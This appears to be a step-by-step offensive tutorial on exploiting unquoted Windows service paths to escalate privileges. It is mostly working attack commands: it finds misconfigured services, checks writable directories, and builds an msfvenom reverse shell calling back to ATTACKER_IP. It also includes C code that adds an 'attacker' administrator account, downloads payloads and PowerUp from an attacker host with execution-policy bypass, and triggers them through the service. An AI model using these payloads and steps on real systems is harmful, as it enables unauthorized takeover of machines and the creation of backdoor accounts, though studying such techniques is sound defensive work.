**Unquoted service paths** are a misconfiguration in Windows services where the executable path contains spaces but is not enclosed in quotes. This causes Windows to ambiguously interpret the path when launching the service, potentially executing unintended binaries.

If an attacker can place a malicious executable in one of the interpreted paths and the service runs with elevated privileges (commonly LocalSystem), this leads to privilege escalation.

---

## Path Parsing Behavior and Execution Flow

When Windows starts a service, it relies on `CreateProcess`. If the binary path is not quoted, the system cannot clearly distinguish the executable from its arguments.

Example:

```text
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

Windows will attempt execution in this order:

```text
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

Each segment ending at a space is treated as a possible executable path. This parsing logic is the core of the vulnerability.

---

## Identifying Misconfigured Services

In cmd, use `wmic`  to highlight suspicious entries:

```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

This filters:

- Non-system services
    
- Paths missing quotation marks
    

The result is a shortlist of candidates worth investigating.

---

## Verifying Exploitability Conditions

### Service Control Permissions

You need to confirm whether the current user can trigger execution:

```powershell
Start-Service GammaService
Stop-Service GammaService
```

If the service can be restarted, exploitation becomes immediate. Otherwise, execution depends on external triggers like system reboot.


### Writable Directory in the Execution Chain

Break the path into possible execution points and check permissions:

```powershell
icacls "C:\Program Files\Enterprise Apps"
```

A directory is exploitable if it allows write or modify access:

```text
BUILTIN\Users:(M)
BUILTIN\Users:(W)
```

The attack only works if at least one of the parsed locations is writable.

---

## Crafting the Payload

The payload must be a Windows executable matching one of the interpreted names.

Using msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o exploit.exe
```

Or a simple privilege escalation binary:

```c
#include <stdlib.h>

int main() {
    system("net user attacker Pass123! /add");
    system("net localgroup administrators attacker /add");
    return 0;
}
```

Compile:

```bash
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe
```

---

## Placing the Malicious Binary

Rename the payload to match a valid parsed candidate:

```bash
mv exploit.exe Current.exe
```

Transfer it to the target:

```bash
python3 -m http.server 8080
```

```powershell
iwr -uri http://ATTACKER_IP:8080/Current.exe -OutFile Current.exe
copy .\Current.exe "C:\Program Files\Enterprise Apps\Current.exe"
```

Correct placement is critical. The filename and directory must align with the parsing order.

---

## Triggering Execution

Start the service:

```powershell
Start-Service GammaService
```

Even if the service throws an error, the payload may already have been executed because Windows attempted earlier paths first.

---

## Resulting Privilege Escalation

Once executed, the payload inherits the service’s privileges.

Verify access:

```powershell
net user
```

```powershell
net localgroup administrators
```

Or capture a reverse shell:

```bash
nc -lvnp 4444
```

If the service runs as LocalSystem, this results in full system compromise.

---

## Automating Discovery and Exploitation

PowerUp simplifies both detection and exploitation.

Load the script:

```powershell
iwr http://ATTACKER_IP/PowerUp.ps1 -OutFile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
```

Identify vulnerable services:

```powershell
Get-UnquotedService
```

Exploit directly:

```powershell
Write-ServiceBinary -Name "GammaService" -Path "C:\Program Files\Enterprise Apps\Current.exe"
Restart-Service GammaService
```

This automates payload placement and execution.
